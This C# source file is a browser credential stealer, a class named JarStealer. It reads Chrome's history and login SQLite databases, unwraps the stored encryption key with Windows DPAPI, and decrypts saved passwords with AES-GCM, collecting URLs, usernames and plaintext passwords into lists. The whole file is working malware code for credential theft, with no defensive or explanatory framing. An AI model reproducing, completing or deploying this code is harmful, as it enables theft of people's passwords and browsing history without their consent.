using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Security.Cryptography;
using System.IO;

namespace Jargon
{
    internal class JarStealer
    {

        public static List<JarPassword> passwords = new List<JarPassword>();
        public static List<JarHistory> historys = new List<JarHistory>();

        public static void StealHistory()
        {
            Program.JargonSqlHandler.connection.ConnectionString = "Data Source=" + Jardirs.GOOGLE_HISTORY;
            Program.JargonSqlHandler.connection.Open();

            SQLiteCommand command = new SQLiteCommand("select url,title,visit_count,last_visit_time from urls", Program.JargonSqlHandler.connection);
            SQLiteDataReader dataReader = command.ExecuteReader();
            dataReader.Read();


            while (dataReader.Read())
            {
                string url = dataReader["url"].ToString();
                string title = dataReader["title"].ToString();
                string visit_count = dataReader["visit_count"].ToString();
                string last_visit_time = dataReader["last_visit_time"].ToString();

                historys.Add(new JarHistory(url, title, visit_count, last_visit_time));

            }
            Program.JargonSqlHandler.connection.Close();
         
        }

     

        public static void StealPasswords()
        {
            Program.JargonSqlHandler.connection.ConnectionString = "Data Source=" + Jardirs.GOOGLE_LOGIN_DATA;
            Program.JargonSqlHandler.connection.Open();
            SQLiteCommand command = new SQLiteCommand("select origin_url,username_value,password_value from logins", Program.JargonSqlHandler.connection);
            SQLiteDataReader dataReader = command.ExecuteReader();
            dataReader.Read();

           
            while (dataReader.Read())
            {
             
                try
                {
                    byte[] encryptedData = GetBytes(dataReader, 2);
                    byte[] nonce, ciphertextTag;
                    AesGcm256.prepare(encryptedData, out nonce, out ciphertextTag);
                    string value = AesGcm256.decrypt(ciphertextTag,GetKey(), nonce);


                    //ConsoleAlert.Success(value);
                    passwords.Add(new JarPassword(dataReader["origin_url"].ToString(), dataReader["username_value"].ToString(), value));

                }
                catch
                {
                    continue;
                }

            }
            Program.JargonSqlHandler.connection.Close();

        }


        public static byte[] GetKey()
        {
            byte[] src = Convert.FromBase64String(Program.KEY);
            byte[] encryptedKey = src.Skip(5).ToArray();

            byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

            return decryptedKey;
        }

        public static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }

        class AesGcm256
        {

            public static string decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
            {
                string sR = String.Empty;
                try
                {
                    GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                    AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                    cipher.Init(false, parameters);
                    byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                    Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                    cipher.DoFinal(plainBytes, retLen);

                    sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
                }
                catch (Exception ex)
                {
                    ConsoleAlert.Error(ex.Message);
                    ConsoleAlert.Error(ex.StackTrace);
                }

                return sR;
            }

            public static void prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
            {
                nonce = new byte[12];
                ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

                System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
                System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
            }
        }
    }
}